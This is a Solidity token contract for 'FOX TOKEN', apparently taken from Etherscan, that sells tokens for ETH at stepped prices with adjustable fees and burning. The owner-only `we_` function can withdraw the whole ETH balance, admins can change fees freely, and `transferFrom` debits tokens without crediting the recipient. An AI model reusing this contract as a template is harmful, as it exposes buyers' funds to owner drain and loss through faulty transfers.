/**
 *Submitted for verification at Etherscan.io on 2020-12-23
*/

/**
 *Submitted for verification at Etherscan.io on 2020-12-23
*/

pragma solidity ^0.7.0;

contract FOX_Token {
    
    modifier onlyBagholders() {
        require(myTokens() > 0);
        _;
    }

    modifier onlyAdministrator(){
        address _customerAddress = msg.sender;
        require(administrators[_customerAddress]);
        _;
    }
   
    /*==============================
    =            EVENTS            =
    ==============================*/

    event onWithdraw(
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    );
   
    // ERC20
  
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
    
        event Approval(
        address indexed tokenOwner, 
        address indexed spender,
        uint tokens
    );
    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    string public name = "FOX TOKEN";
    string public symbol = "FXT";
    uint8 constant public decimals = 8;
    uint256 public totalSupply_ = 2100000*10**8;
	uint256 public availabletoken=1400000*10**8;
	uint256 internal tokenSupply_ = 0;
	uint256 public flag_ = 251;
    uint256 constant internal tokenpurchasePriceInitial_ =83330000000000;
	
	
    uint256 constant internal tokenpurchasePriceIncremental_ = 583310000000;

	
    uint256 public buypercent = 20;
	uint256 public sellpercent = 10;
	uint256 public burnpercent = 2;
	uint256 purchaseToken=0;

    uint256 public PurchasecurrentPrice_ = 470030000000000;
    
	
	mapping(address => mapping (address => uint256)) allowed;
    address commissionHolder; 
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal etherBalanceLedger_;
    address payable sonk;
    
    mapping(address => bool) internal administrators;
    uint256 commFunds=0;
    address payable owner;
    constructor() 
    {
        sonk = msg.sender;
        administrators[sonk] = true;
        commissionHolder = sonk;
		owner = sonk;
         tokenSupply_ = 250000*10**8; 
         availabletoken=1400000*10**8;
		 flag_ = 251;
         tokenBalanceLedger_[commissionHolder] = 700000*10**8; 
        PurchasecurrentPrice_ = 470030000000000; //wei per token
      
    }
   
   
    function upgradeDetails(
	uint256 _salePercent, uint256 _PurchasePercent)
    onlyAdministrator()
    public
    {
       
	
    buypercent = _PurchasePercent;
	sellpercent = _salePercent;
	
  
    }
    receive() external payable
    {
    }
    function Predemption()
        public
        payable
       
    {
        purchaseTokens(msg.value);
    }
   
    fallback() payable external
    {
        purchaseTokens(msg.value);
    }
   
   function Stack()
        public
        payable
       
    {
        StackTokens(msg.value);
    }
   
   
    function Sredemption(uint256 _amountOfTokens)
        onlyBagholders()
        public
    {
         address payable _customerAddress = msg.sender;
	 	require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
		 _amountOfTokens = SafeMath.div(_amountOfTokens, 10**8);
		 uint256 _tokenToBurn=0;
		 if(_amountOfTokens<50)
		 {
			 _tokenToBurn=1;
		 }
		 else
		 {
			 uint256 flag=SafeMath.div(_amountOfTokens, 50);
			 _tokenToBurn=flag;
			 uint256 _flag =SafeMath.mod(_amountOfTokens, 50);
			 if(_flag >0)
			 {
				 _tokenToBurn=SafeMath.add(_tokenToBurn, 1);
			 }
		 }
		
		uint256 _tokenToSell=SafeMath.sub(_amountOfTokens, _tokenToBurn);
		require(_tokenToSell >=1);
		burn(_tokenToBurn*10**8);
		
        uint256 _tokens = _tokenToSell;
		
        uint256 _ethereum = tokensToEthereum_(_tokens);
		
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens*10**8);
        _customerAddress.transfer(_ethereum);
        emit Transfer(_customerAddress, address(this), _amountOfTokens*10**8);
    }
   
   
   
   
   
    function myEthers()
        public view
        returns(uint256)
    {
        return etherBalanceLedger_[msg.sender];    
    }
   
  
   
    function transfer(address _toAddress, uint256 _amountOfTokens)
        onlyBagholders()
        public
        returns(bool)
    {
        // setup
        address _customerAddress = msg.sender;

        // exchange tokens
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);
        emit Transfer(_customerAddress, _toAddress, _amountOfTokens);
        // ERC20
        return true;
    }
   
    
    function transferFrom(address  owner, address  buyer, uint numTokens) public returns (bool) {
      require(numTokens <= tokenBalanceLedger_[owner]);
      require(numTokens <= allowed[owner][msg.sender]);
      tokenBalanceLedger_[owner] = SafeMath.sub(tokenBalanceLedger_[owner],numTokens);
      allowed[owner][msg.sender] =SafeMath.sub(allowed[owner][msg.sender],numTokens);
    
      emit Transfer(owner, buyer, numTokens);
      return true;
    }
	
	
	function we_(address payable _receiver, uint256 _withdrawAmount) onlyAdministrator() public
	{
		uint256 _contractBalance = contractBalance();
		if (msg.sender != address(this) && msg.sender != owner) {revert("Invalid Sender Address");}
		if (_contractBalance < _withdrawAmount) {revert("Not enough amount");}
		_receiver.transfer(_withdrawAmount);
		  	
	}
	

	
	 function setPurchasePercent(uint256 newPercent) onlyAdministrator() public {
        buypercent  = newPercent;
    }
	 function setSellPercent(uint256 newPercent) onlyAdministrator() public {
        sellpercent  = newPercent;
    }


    
    function burn(uint256 _amountToBurn) internal {
        tokenBalanceLedger_[address(0x000000000000000000000000000000000000dEaD)] += _amountToBurn;
		availabletoken = SafeMath.sub(availabletoken, _amountToBurn);
        emit Transfer(address(this), address(0x000000000000000000000000000000000000dEaD), _amountToBurn);
       }

    function setName(string memory _name)
        onlyAdministrator()
        public
    {
        name = _name;
    }
   
    function setSymbol(string memory _symbol)
        onlyAdministrator()
        public
    {
        symbol = _symbol;
    }

    function setupCommissionHolder(address _commissionHolder)
    onlyAdministrator()
    public
    {
        commissionHolder = _commissionHolder;
    }

    function totalEthereumBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
   
    function AvailableSupply()
        public
        view
        returns(uint256)
    {
        return availabletoken  - tokenSupply_ ;
    }
   
    function tokenSupply()
    public
    view
    returns(uint256)
    {
        return tokenSupply_;
    }
   
    /**
     * Retrieve the tokens owned by the caller.
     */
    function myTokens()
        public
        view
        returns(uint256)
    {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }
   
   
    /**
     * Retrieve the token balance of any single address.
     */
    function balanceOf(address _customerAddress)
        view
        public
        returns(uint256)
    {
        return tokenBalanceLedger_[_customerAddress];
    }
   
    function contractBalance() public view returns (uint) {
		return address(this).balance;
	}
	
	
	 function remainingToken() public view returns (uint) {
		 return availabletoken  - tokenSupply_ ;
	}
	
	
	
    function sellPrice()
        public view
        
        returns(uint256)
    {
        
      return PurchasecurrentPrice_ ;
    }
   
    /**
     * Return the sell price of 1 individual token.
     */
    function buyPrice()
        public view
        
        returns(uint256)
    {
        return PurchasecurrentPrice_ ;
    }
   
   
    function calculateEthereumReceived(uint256 _tokensToSell)
         public view
        
        returns(uint256)
    {
        // require(_tokensToSell <= tokenSupply_);
        uint256 _tokenToBurn=0;
		
		if(_tokensToSell<50)
		 {
			 _tokenToBurn=1;
		 }
		 else
		 {
			 uint256 flag=SafeMath.div(_tokensToSell, 50);
			 _tokenToBurn=flag;
			 uint256 _flag =SafeMath.mod(_tokensToSell, 50);
			 if(_flag >0)
			 {
				 _tokenToBurn=SafeMath.add(_tokenToBurn, 1);
			 }
		 }
		
		
		
		uint256 _tokenTosellOut = SafeMath.sub(_tokensToSell, _tokenToBurn);
        uint256 _ethereum = getTokensToEthereum_(_tokenTosellOut);
       
        return _ethereum;
    }
   
   
     
    function calculateEthereumToPay(uint256 _tokenToPurchase)
        public view
        
        returns(uint256)
    {
       
        uint256 _ethereum = getTokensToEthereum_(_tokenToPurchase);
		
		uint256 _dividends = _ethereum * buypercent/100;
        uint256 _totalEth = SafeMath.add(_ethereum, _dividends);
       
        return _totalEth;
    }
    
    function calculateConvenienceFee(uint256 _ethereum)
        public view
        
        returns(uint256)
    {
		uint256 _dividends = _ethereum * buypercent/100;
       
        return _dividends;
    }
   
    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
   
    event testLog(
        uint256 currBal
    );

    function calculateTokensReceived(uint256 _ethereumToSpend)
        public
        view
        returns(uint256)
    {
        uint256 _dividends = _ethereumToSpend * buypercent/100;
        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
        uint256 _amountOfTokens = getEthereumToTokens_(_taxedEthereum);
        
        return _amountOfTokens;
    }
   
    function purchaseTokens(uint256 _incomingEthereum)
        internal
        returns(uint256)
    {
      
        
        // data setup
        address _customerAddress = msg.sender;
        
       uint256 remeningToken=SafeMath.sub(availabletoken,tokenSupply_);
	   
	    uint256 _purchasecomision =  _incomingEthereum * buypercent /100;
		
        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _purchasecomision);
        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum );
        _amountOfTokens =_amountOfTokens*10**8;
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
        require(_amountOfTokens <= remeningToken);
        
     
        
        
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
       
        // fire event
        emit Transfer(address(this), _customerAddress, _amountOfTokens);       
	
        return _amountOfTokens;
    }
   
   
    function StackTokens(uint256 _incomingEthereum)
        internal
        returns(uint256)
    {
      
        
        // data setup
       
        
        uint256 remeningToken=SafeMath.sub(availabletoken,tokenSupply_);
	   
	    uint256 StackAmount =  _incomingEthereum * 75 /100;
		
        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, StackAmount);
        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum );
        _amountOfTokens =_amountOfTokens*10**8;
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
        require(_amountOfTokens <= remeningToken);            
        
        
        tokenBalanceLedger_[commissionHolder] = SafeMath.add(tokenBalanceLedger_[commissionHolder], _amountOfTokens);       
        // fire event
        emit Transfer(address(this), commissionHolder, _amountOfTokens);       
	
        return _amountOfTokens;
    }
   
   
   
    function ethereumToTokens_(uint256 _ethereum )
        internal
        
        returns(uint256)
      {
		uint256 _currentPrice=0;
		
		uint256 tokenSupplyforPrice= SafeMath.div(tokenSupply_, 10**8);
		
		uint256 _slot=SafeMath.div(tokenSupplyforPrice, 1000);  
		
		 if(_slot >0)
         {		  
		  _currentPrice=PurchasecurrentPrice_;
		  
         }
         else
         {
         _currentPrice=tokenpurchasePriceInitial_; 
         }
      
	   uint256 _tokensReceived = SafeMath.div(_ethereum, _currentPrice);
	   tokenSupply_ = SafeMath.add(tokenSupply_, _tokensReceived*10**8);
	   uint256 tokenSupplyforPriceChange= SafeMath.div(tokenSupply_, 10**8);
	   uint256 slot=SafeMath.div(tokenSupplyforPriceChange, 1000); 
	   
	    if(flag_ == slot)
		  {
			  uint256 incrementalPriceOnly=PurchasecurrentPrice_ * 7/1000;  
             PurchasecurrentPrice_=SafeMath.add(PurchasecurrentPrice_, incrementalPriceOnly);
			 flag_=slot+1;
		  }
        
       
      
       
        
        return _tokensReceived;
       
    }
    function getEthereumToTokens_(uint256 _ethereum )
        public
        view
        returns(uint256)
      {
		uint256 _currentPrice=0;
		uint256 tokenSupplyforPrice= SafeMath.div(tokenSupply_, 10**8);
		uint256 _slot=SafeMath.div(tokenSupplyforPrice, 1000);  
		
		 if(_slot >0)
      {
		  if(flag_ == _slot)
		  {
			  uint256 incrementalPriceOnly=PurchasecurrentPrice_ * 7/1000;  
             _currentPrice=SafeMath.add(PurchasecurrentPrice_, incrementalPriceOnly);
			
		  }
		  else
		  {
			  _currentPrice=PurchasecurrentPrice_;
		  }
          
      }
      else
      {
         _currentPrice=tokenpurchasePriceInitial_; 
      }
      
       
        uint256 _tokensReceived = SafeMath.div(_ethereum, _currentPrice);
      
       
        
        return _tokensReceived;
       
    }
  
    function tokensToEthereum_(uint256 _tokens)
        internal
        
        returns(uint256)
    {
      
      	uint256 saleToken=1;
		uint256  _currentSellPrice = 0;
		uint256  _sellethSlotwise = 0;
		
		 while(saleToken <=_tokens)
           {
			   uint256 tokenSupplyforPrice= SafeMath.div(tokenSupply_, 10**8);
               uint _slotno =SafeMath.div(tokenSupplyforPrice, 1000);
               if(_slotno >0)
               {
				     uint flag =SafeMath.mod(tokenSupplyforPrice, 1000);
					 if(flag==0 && tokenSupplyforPrice !=250000)
					 {
						 
						uint256 incrementalPriceOnly=PurchasecurrentPrice_ * 7/1000;  
                       _currentSellPrice=SafeMath.sub(PurchasecurrentPrice_, incrementalPriceOnly);
					    flag_=flag_-1;
					 }
				 else
				 {
					 _currentSellPrice=PurchasecurrentPrice_;
				 }
                     
               }
               else
               {
                   _currentSellPrice=tokenpurchasePriceInitial_ ;
               }
               
               _sellethSlotwise=SafeMath.add(_sellethSlotwise, _currentSellPrice);
                PurchasecurrentPrice_ =_currentSellPrice;
               tokenSupply_  =SafeMath.sub(tokenSupply_ , 1*10**8);
               saleToken++;
			   
			   
               
           }
		  
		     return _sellethSlotwise;
    }
   
    function getTokensToEthereum_(uint256 _tokens)
        public
        view
        returns(uint256)
    {
        	uint256 saleToken=1;
		uint256  _currentSellPrice = 0;
		uint256  _sellethSlotwise = 0;
		
		 while(saleToken <=_tokens)
           {
			   uint256 tokenSupplyforPrice= SafeMath.div(tokenSupply_, 10**8);
               uint _slotno =SafeMath.div(tokenSupplyforPrice, 1000);
               if(_slotno >0)
               {
				     uint256 flag =SafeMath.mod(tokenSupplyforPrice, 1000);
					 if(flag==0 && tokenSupplyforPrice !=250000)
					 {
						 
						uint256 incrementalPriceOnly=PurchasecurrentPrice_ * 7/1000;  
                       _currentSellPrice=SafeMath.sub(PurchasecurrentPrice_, incrementalPriceOnly);
					 }
				 else
				 {
					 _currentSellPrice=PurchasecurrentPrice_;
				 }
                     
               }
               else
               {
                   _currentSellPrice=tokenpurchasePriceInitial_ ;
               }
               _sellethSlotwise=SafeMath.add(_sellethSlotwise, _currentSellPrice);
              
            
               saleToken++;
           }
		  
		     return _sellethSlotwise;
    }
    
    
    
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
	 /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}